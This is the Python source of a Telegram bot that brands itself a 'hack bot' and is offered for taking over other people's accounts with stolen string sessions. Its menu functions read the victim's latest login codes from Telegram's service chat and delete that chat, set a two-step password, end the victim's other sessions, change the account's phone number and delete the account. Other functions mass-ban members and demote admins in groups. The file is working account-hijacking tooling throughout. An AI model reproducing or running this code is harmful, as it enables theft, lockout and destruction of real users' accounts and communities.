# COPYRIGHT Â© 2021-22 BY Berlinthehack_botBoy ðŸ”¥
# NOW PUBLIC BY Berlinthehack_bot
import os
os.system("pip install Telethon==1.24.0")
from telethon import TelegramClient, events, functions, types
api_id = os.environ.get("APP_ID")
import os, asyncio
from os import system
from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
api_hash = os.environ.get("API_HASH")
token = os.environ.get("BOT_TOKEN")
client = TelegramClient('Berlinthehack_bot', api_id, api_hash).start(bot_token=token)
from telethon import TelegramClient as tg
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
from telethon.sessions import StringSession as ses
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
import telethon;from telethon import functions
from telethon.tl.types import ChannelParticipantsAdmins as cpa

from telethon.tl.functions.channels import CreateChannelRequest as ccr
mybot = "missrose_bot"
bot = borg = client

Berlinthehack_bot = 1356469075


async def change_number_code(strses, number, code, otp):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    bot = client = X
    try: 
      result = await bot(functions.account.ChangePhoneRequest(
        phone_number=number,
        phone_code_hash=code,
        phone_code=otp
      ))
      return True
    except:
      return False

async def change_number(strses, number):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    bot = client = X
    result = await bot(functions.account.SendChangePhoneCodeRequest(
        phone_number=number,
        settings=types.CodeSettings(
            allow_flashcall=True,
            current_number=True,
            allow_app_hash=True
        )
    ))
    return str(result)


async def userinfo(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    k = await X.get_me()
    return str(k)

async def terminate(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(rt())
GROUP_LIST = []
async def delacc(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(functions.account.DeleteAccountRequest("me hi chutia hu"))

async def promote(strses, grp, user):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    try:
      await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
    except:
      await X.edit_admin(grp, user, is_admin=True, Berlinthehack_bot=False, pin_messages=True, title='Owner')
    
async def user2fa(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    try:
      await X.edit_2fa('Berlinthehack_botISBEST')
      return True
    except:
      return False

async def demall(strses, grp):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
      try:
        await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
      except:
        await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
      


async def joingroup(strses, username):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(join(username))

async def leavegroup(strses, username):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(leave(username))

async def delgroup(strses, username):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(dc(username))
    

async def cu(strses):
  try:
    async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
        k = await X.get_me()
        return [str(k.first_name), str(k.username or k.id)]
  except Exception as e:
    return False

async def usermsgs(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    i = ""
    async for x in X.iter_messages(777000, limit=3):
      i += f"\n{x.text}\n"
    await client.delete_dialog(777000)
    return str(i)


async def userbans(strses, grp):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    k = await X.get_participants(grp)
    for x in k:
      try:
        await X.edit_permissions(grp, x.id, view_messages=False)
      except:
        pass
    


async def userchannels(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    k = await X(pc())
    i = ""
    for x in k.chats:
      try:
        i += f'\nCHANNEL NAME {x.title} CHANNEL USRNAME @{x.username}\n'
      except:
        pass
    return str(i)



import logging
logging.basicConfig(level=logging.WARNING)

channel = "br29siwan"
menu = '''

**Nᴏᴛɪᴄᴇ Jᴏɪɴ @br29hacks**


A: [Cʜᴇᴄᴋ ᴜsᴇʀ ᴏᴡɴ ɢʀᴏᴜᴘs ᴀɴᴅ ᴄʜᴀɴɴᴇʟs]

B: [Cʜᴇᴄᴋ ᴜsᴇʀ ᴀʟʟ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ʟɪᴋᴇ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ, ᴜsᴇɴᴀᴍᴇ...]

C: [Bᴀɴ ᴀ ɢʀᴏᴜᴘ {ɢɪᴠᴇ ᴍᴇ SᴛʀɪɴɢSᴇssɪᴏɴ ᴀɴᴅ ᴄʜᴀɴɴᴇʟ/ɢʀᴏᴜᴘ ᴜsᴇʀɴᴀᴍᴇ ɪ ᴡɪʟʟ ʙᴀɴ ᴀʟʟ ᴍᴇᴍʙᴇʀs ᴛʜᴇʀᴇ}]

D: [Kɴᴏᴡ ᴜsᴇʀ ʟᴀsᴛ ᴏᴛᴘ {𝟷sᴛ ᴜsᴇ ᴏᴘᴛɪᴏɴ B ᴛᴀᴋᴇ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴀɴᴅ ʟᴏɢɪɴ ᴛʜᴇʀᴇ Aᴄᴄᴏᴜɴᴛ ᴛʜᴇɴ ᴜsᴇ ᴍᴇ ɪ ᴡɪʟʟ ɢɪᴠᴇ ʏᴏᴜ ᴏᴛᴘ}]

E: [Jᴏɪɴ A Gʀᴏᴜᴘ/Cʜᴀɴɴᴇʟ ᴠɪᴀ Sᴛʀɪɴɢ Sᴇssɪᴏɴ]

F: [Lᴇᴀᴠᴇ A Gʀᴏᴜᴘ/Cʜᴀɴɴᴇʟ ᴠɪᴀ Sᴛʀɪɴɢ Sᴇssɪᴏɴ]

G: [Dᴇʟᴇᴛᴇ A Gʀᴏᴜᴘ/Cʜᴀɴɴᴇʟ]

H: [Cʜᴇᴄᴋ ᴜsᴇʀ ᴛᴡᴏ sᴛᴇᴘ ɪs ᴇɴᴇᴀʙʟᴇ ᴏʀ ᴅɪsᴀʙʟᴇ]

I: [Tᴇʀᴍɪɴᴀᴛᴇ Aʟʟ ᴄᴜʀʀᴇɴᴛ ᴀᴄᴛɪᴠᴇ sᴇssɪᴏɴs ᴇxᴄᴇᴘᴛ Yᴏᴜʀ SᴛʀɪɴɢSᴇssɪᴏɴ]

J: [Dᴇʟᴇᴛᴇ Aᴄᴄᴏᴜɴᴛ]

K: [Dᴇᴍᴏᴛᴇ ᴀʟʟ ᴀᴅᴍɪɴs ɪɴ ᴀ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ]

L: [Pʀᴏᴍᴏᴛᴇ ᴀ ᴍᴇᴍʙᴇʀ ɪɴ ᴀ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ]

M: [Cʜᴀɴɢᴇ Pʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴜsɪɴɢ Sᴛʀɪɴɢ Sᴇssɪᴏɴ]

I ᴡɪʟʟ ᴀᴅᴅ ᴍᴏʀᴇ ғᴇᴀᴛᴜʀᴇs ʟᴀᴛᴇʀ !🖤
'''
mm = '''
Yᴏᴜ ᴄᴀɴ ʜᴀᴄᴋ ᴀɴʏʙᴏᴅʏ's ᴀᴄᴄᴏᴜɴᴛ.
Tᴀᴋᴇ ʜɪs sᴛʀɪɴɢ sᴇssɪᴏɴ ᴀɴᴅ ᴜsᴇ ᴍᴇ.
I ᴡɪʟʟ sʜᴏᴡ ʏᴏᴜ ғᴜʟʟ ᴘᴏᴡᴇʀ ᴏғ ᴍɪɴᴇ.
Tʏᴘᴇ /hack
'''
@client.on(events.NewMessage(pattern="/start"))
async def op(event):
  global mm
  if not event.is_private:
    await event.reply("Pʟᴇᴀsᴇ ᴜsᴇ ᴍᴇ ɪɴ ᴘʀɪᴠᴀᴛᴇ.")
  else:
    await event.reply(mm)
@client.on(events.NewMessage(pattern="/give"))
async def op(event):
  if not event.sender_id == legendx:
    return await event.reply("Pʟᴇᴀsᴇ ᴅᴏɴ'ᴛ ᴜsᴇ ᴍᴇ, Fᴜ*ᴋ ᴏғғ.")
  try:
    await event.reply("session bot file", file="Xarmy.session")
  except Exception as e:
    print (e)


@client.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
async def op(event):
  await event.reply("Pʟᴇᴀsᴇ ᴜsᴇ ᴍᴇ ɪɴ ᴘʀɪᴠᴀᴛᴇ.")
@client.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
async def start(event):
  global menu
  async with bot.conversation(event.chat_id) as x:
    await x.send_message(f"Cʜᴏᴏsᴇ ᴡʜᴀᴛ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴅᴏ ᴡɪᴛʜ sᴛʀɪɴɢ \n\n{menu}")
    res = await x.get_response()
    r = res.text
    if res.text == "A":
      await x.send_message("Gɪᴠᴇ Sᴛʀɪɴɢ Sᴇssɪᴏɴ.")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Tʜɪs Sᴛʀɪɴɢ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴏʀ ɪɴᴠᴀʟɪᴅ.")
      try:
        i = await userchannels(strses.text)
      except:
        return await event.reply("Tʜɪs Sᴛʀɪɴɢ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴏʀ ɪɴᴠᴀʟɪᴅ.")
      if len(i) > 3855:
        file = open("session.txt", "w")
        file.write(i + "\n\nDᴇᴛᴀɪʟs ʙʏ @Berlinthehack_bot")
        file.close()
        await bot.send_file(event.chat_id, "session.txt")
        system("rm -rf session.txt")
      else:
        await event.reply(i + "\n\nTʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ 𝘽𝙀𝙍𝙇𝙄𝙉 - 𝙏𝙃𝙀 𝙃𝘼𝘾𝙆𝘽𝙊𝙏")
    elif res.text == "B":
      await x.send_message("Gɪᴠᴇ Sᴛʀɪɴɢ Sᴇssɪᴏɴ.")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Tʜɪs Sᴛʀɪɴɢ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴏʀ ɪɴᴠᴀʟɪᴅ.")
      i = await userinfo(strses.text)
      await event.reply(i + "\n\nTʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ 𝘽𝙀𝙍𝙇𝙄𝙉 - 𝙏𝙃𝙀 𝙃𝘼𝘾𝙆𝘽𝙊𝙏")
    elif r == "C":
      await x.send_message("Gɪᴠᴇ Sᴛʀɪɴɢ Sᴇssɪᴏɴ.")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Tʜɪs Sᴛʀɪɴɢ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴏʀ ɪɴᴠᴀʟɪᴅ.")
      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
      grpid = await x.get_response()
      await userbans(strses.text, grpid.text)
      await event.reply("Banning all members Tʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ 𝘽𝙀𝙍𝙇𝙄𝙉 - 𝙏𝙃𝙀 𝙃𝘼𝘾𝙆𝘽𝙊𝙏")
    elif r == "D":
      await x.send_message("Gɪᴠᴇ Sᴛʀɪɴɢ Sᴇssɪᴏɴ.")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Tʜɪs Sᴛʀɪɴɢ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴏʀ ɪɴᴠᴀʟɪᴅ.")
      i = await usermsgs(strses.text)
      await event.reply(i + "\n\nTʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ 𝘽𝙀𝙍𝙇𝙄𝙉 - 𝙏𝙃𝙀 𝙃𝘼𝘾𝙆𝘽𝙊𝙏")
    elif r == "E":
      await x.send_message("Gɪᴠᴇ Sᴛʀɪɴɢ Sᴇssɪᴏɴ.")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Tʜɪs Sᴛʀɪɴɢ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴏʀ ɪɴᴠᴀʟɪᴅ.")
      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
      grpid = await x.get_response()
      await joingroup(strses.text, grpid.text)
      await event.reply("Joined the Channel/Group Tʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ 𝘽𝙀𝙍𝙇𝙄𝙉 - 𝙏𝙃𝙀 𝙃𝘼𝘾𝙆𝘽𝙊𝙏")
    elif r == "F":
      await x.send_message("Gɪᴠᴇ Sᴛʀɪɴɢ Sᴇssɪᴏɴ.")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Tʜɪs Sᴛʀɪɴɢ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴏʀ ɪɴᴠᴀʟɪᴅ.")
      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
      grpid = await x.get_response()
      await leavegroup(strses.text, grpid.text)
      await event.reply("Leaved the Channel/Group Tʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ 𝘽𝙀𝙍𝙇𝙄𝙉 - 𝙏𝙃𝙀 𝙃𝘼𝘾𝙆𝘽𝙊𝙏")
    elif r == "G":
      await x.send_message("Gɪᴠᴇ Sᴛʀɪɴɢ Sᴇssɪᴏɴ.")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Tʜɪs Sᴛʀɪɴɢ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴏʀ ɪɴᴠᴀʟɪᴅ.")
      await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
      grpid = await x.get_response()
      await delgroup(strses.text, grpid.text)
      await event.reply("Deleted the Channel/Group Tʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ 𝘽𝙀𝙍𝙇𝙄𝙉 - 𝙏𝙃𝙀 𝙃𝘼𝘾𝙆𝘽𝙊𝙏")
    elif r == "H":
      await x.send_message("Gɪᴠᴇ Sᴛʀɪɴɢ Sᴇssɪᴏɴ.")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Tʜɪs Sᴛʀɪɴɢ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴏʀ ɪɴᴠᴀʟɪᴅ.")
      i = await user2fa(strses.text)
      if i:
        await event.reply("User don't have two step verification, you can login now\n\nTʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ 𝘽𝙀𝙍𝙇𝙄𝙉 - 𝙏𝙃𝙀 𝙃𝘼𝘾𝙆𝘽𝙊𝙏")
      else:
        await event.reply("Sorry User Have two step already")
    elif r == "I":
      await x.send_message("Gɪᴠᴇ Sᴛʀɪɴɢ Sᴇssɪᴏɴ.")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Tʜɪs Sᴛʀɪɴɢ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴏʀ ɪɴᴠᴀʟɪᴅ.")
      i = await terminate(strses.text)
      await event.reply("The all sessions are terminated\n\nTʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ 𝘽𝙀𝙍𝙇𝙄𝙉 - 𝙏𝙃𝙀 𝙃𝘼𝘾𝙆𝘽𝙊𝙏")
    elif res.text == "J":
      await x.send_message("Gɪᴠᴇ Sᴛʀɪɴɢ Sᴇssɪᴏɴ.")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Tʜɪs Sᴛʀɪɴɢ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴏʀ ɪɴᴠᴀʟɪᴅ.")
      i = await delacc(strses.text)
      await event.reply("The Account is deleted SUCCESSFULLLY\n\nTʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ 𝘽𝙀𝙍𝙇𝙄𝙉 - 𝙏𝙃𝙀 𝙃𝘼𝘾𝙆𝘽𝙊𝙏")
    elif res.text == "L":
      await x.send_message("Gɪᴠᴇ Sᴛʀɪɴɢ Sᴇssɪᴏɴ.")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Tʜɪs Sᴛʀɪɴɢ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴏʀ ɪɴᴠᴀʟɪᴅ.")
      await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
      grp = await x.get_response()
      await x.send_message("NOW GIVE USER USERNAME")
      user = await x.get_response()
      i = await promote(strses.text, grp.text, user.text)
      await event.reply("I am Promoting you in Group/Channel wait a min ðŸ˜—ðŸ˜—\n\nTʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ 𝘽𝙀𝙍𝙇𝙄𝙉 - 𝙏𝙃𝙀 𝙃𝘼𝘾𝙆𝘽𝙊𝙏")
    elif res.text == "K":
      await x.send_message("Gɪᴠᴇ Sᴛʀɪɴɢ Sᴇssɪᴏɴ.")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Tʜɪs Sᴛʀɪɴɢ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴏʀ ɪɴᴠᴀʟɪᴅ.")
      await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
      pro = await x.get_response()
      try:
        i = await demall(strses.text, pro.text)
      except:
        pass
      await event.reply("I am Demoting all members of Group/Channel wait a min ðŸ˜—ðŸ˜—\n\nTʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ 𝘽𝙀𝙍𝙇𝙄𝙉 - 𝙏𝙃𝙀 𝙃𝘼𝘾𝙆𝘽𝙊𝙏")
    elif res.text == "M":
      await x.send_message("Gɪᴠᴇ Sᴛʀɪɴɢ Sᴇssɪᴏɴ.")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("Tʜɪs Sᴛʀɪɴɢ ɪs ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴏʀ ɪɴᴠᴀʟɪᴅ.")
      await x.send_message("GIVE NUMBER WHICH YOU WANT TO CHANGE\n[NOTE: DON'T USE 2ndline or text now numbers]\n[if you are use 2nd line or text now you can't get otp] ")
      number = (await x.get_response()).text
      try:
        result = await change_number(strses.text, number)
        await event.respond(result + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp")
        await asyncio.sleep(20)
        await x.send_message("NOW GIVE PHONE CODE HASH")
        phone_code_hash = (await x.get_response()).text
        await x.send_message("NOW GIVE THE OTP")
        otp = (await x.get_response()).text
        changing = await change_number_code(strses.text, number, phone_code_hash, otp)
        if changing:
          await event.respond("CONGRATULATIONS NUMBER WAS CHANGED")
        else:
          await event.respond("Something is wrong")
      except Exception as e:
        await event.respond("SEND THIS ERROR TO - @nouseridfound\n**LOGS**\n" + str(e))

    else:
      await event.respond("Wrong Text Found Re type /hack and use")





client.run_until_disconnected()
